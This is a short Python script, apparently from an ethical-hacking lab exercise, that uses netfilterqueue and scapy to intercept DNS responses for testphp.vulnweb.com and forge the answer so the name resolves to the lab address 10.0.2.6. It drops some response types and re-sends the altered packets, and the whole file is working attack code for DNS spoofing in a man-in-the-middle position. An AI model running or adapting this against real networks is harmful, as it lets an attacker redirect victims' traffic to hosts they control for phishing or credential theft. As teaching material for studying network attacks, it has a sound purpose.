import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.DNSRR):
		# print(scapy_packet.show())
		qname = scapy_packet[scapy.DNSQR].qname.decode()
		if "testphp.vulnweb.com" in qname:
			print(scapy_packet[scapy.DNSRR].type)
			if scapy_packet[scapy.DNSRR].type == 6:
				packet.drop()
				print("drop trust dns packet")
				return
			
			print("[+] Spoofing target")
			answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.6", type = "A")
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1
			
			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].chksum
			del scapy_packet[scapy.UDP].len

			#packet.set_payload(bytes(scapy_packet))
	# packet.accept()
	packet.drop()
	scapy.send(scapy_packet,verbose=False)
	
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
